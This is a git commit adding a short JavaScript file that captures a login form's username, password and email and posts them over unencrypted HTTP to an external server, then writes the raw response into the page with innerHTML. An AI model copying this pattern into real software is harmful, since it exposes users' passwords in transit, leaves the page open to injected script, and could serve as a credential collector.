585b77e2f51b58cf197b42f5407ae1da24aaa055
Panamkaff <volffmasha@gmail.com>
2025-07-04 17:13:33 +0300

    Загрузили файлы

---
+++ script.js
@@ -0,0 +1,20 @@
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const data = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value,
+                date: new Date().toLocaleString()
+            };
+
+            // Отправляем данные на сервер
+            const response = await fetch('http://summerserver.onrender.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            const result = await response.text();
+            document.body.innerHTML = result;
+        });
